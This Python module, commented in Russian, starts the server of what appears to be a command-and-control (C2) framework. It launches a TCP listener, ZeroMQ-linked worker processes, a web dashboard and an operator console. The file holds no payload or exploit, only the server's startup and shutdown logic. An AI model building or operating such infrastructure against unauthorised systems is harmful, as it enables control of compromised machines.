import asyncio
import multiprocessing
import zmq
import zmq.asyncio
import webbrowser  # <-- НОВОЕ ИСПРАВЛЕНИЕ: Добавлен импорт webbrowser
from logs import Log as logger
# Импортируем все необходимые адреса и порты
from backend import IP, PORT, NUM_WORKERS, ZMQ_PUSH_PULL_ADDR, API_PORT
# Импортируем функцию для запуска API-сервера
from backend.API import run_fastapi_server
from .ClientConnection import client_handler
# Корректный импорт из вложенного модуля CLI
from backend.CLI.CLI import operator_interface, print_c2_ready_message
from .Worker import module_worker
from backend import start_benchmark


async def start_server():
    log_queue = multiprocessing.Queue()
    zmq_ctx = zmq.asyncio.Context()

    # 1. ZeroMQ PUSH/PULL (ClientHandler -> Workers)
    push_socket = zmq_ctx.socket(zmq.PUSH)
    push_socket.bind(ZMQ_PUSH_PULL_ADDR)  # BIND-им сокет для воркеров
    push_socket.set_hwm(0)
    logger.info(f"[+] ZeroMQ PUSH socket bound to {ZMQ_PUSH_PULL_ADDR}")

    # Запуск основного сервера
    server = await asyncio.start_server(lambda r, w: client_handler(r, w, push_socket), IP, PORT, reuse_address=True,
                                        backlog=1000)
    addr = server.sockets[0].getsockname()
    logger.info(f"[+] Server started on {addr}")

    # Задачи, работающие в основном event loop
    log_task = asyncio.create_task(logger.start_queue_listener(log_queue))

    # 2. Запуск воркеров (отдельные процессы)
    process_list = []
    for _ in range(NUM_WORKERS):
        p = multiprocessing.Process(target=module_worker, args=(log_queue,))
        p.start()
        process_list.append(p)
    logger.info(f"[+] {NUM_WORKERS} worker processes started")

    # 3. ZeroMQ PULL/WebSocket (Workers -> API -> Frontend)
    api_task = asyncio.create_task(run_fastapi_server(IP, API_PORT))

    # 4. Бенчмарк
    start_benchmark(asyncio.get_running_loop(), interval=1)

    # 5. СИНХРОНИЗАЦИЯ И ЗАПУСК CLI

    # Даем 1.5с на гарантированный вывод всех стартовых логов (ЗДЕСЬ)
    await asyncio.sleep(1.5)

    # 1. ЗАПУСКАЕМ БРАУЗЕР (ВЫВОДИТ ЛОГ)
    webbrowser.open(f"http://{IP}:{API_PORT}/ui/dashboard/dashboard.html")
    # Лог о браузере теперь выведется до рамки!
    logger.info("[+] Dashboard should open shortly in your browser.")

    # 2. Выводим чистую рамку подсказки ПОСЛЕ ЛОГА О БРАУЗЕРЕ
    print_c2_ready_message()

    # 3. Запускаем CLI как задачу (С ЭТОГО МОМЕНТА patch_stdout будет работать для >>)
    cli_task = asyncio.create_task(operator_interface(server))

    async with server:
        try:
            # Собираем все асинхронные задачи.
            await asyncio.gather(server.serve_forever(), log_task, api_task, cli_task)
        except asyncio.CancelledError:
            logger.info("[*] Server shutdown initiated by user.")
        except Exception as e:
            logger.error(f"[!!!] Критическая ошибка в основном цикле сервера: {e}")
            raise
        finally:
            # Код очистки
            for p in process_list:
                p.terminate()
                p.join()
            logger.info("[*] All workers terminated")

            log_queue.put("STOP")
            api_task.cancel()  # <--- Ключевой вызов
            cli_task.cancel()

            # Ожидаем завершения ВСЕХ отмененных задач.
            await asyncio.gather(log_task, api_task, cli_task, return_exceptions=True)

            push_socket.close()
            zmq_ctx.term()
            logger.info("[*] ZeroMQ context terminated")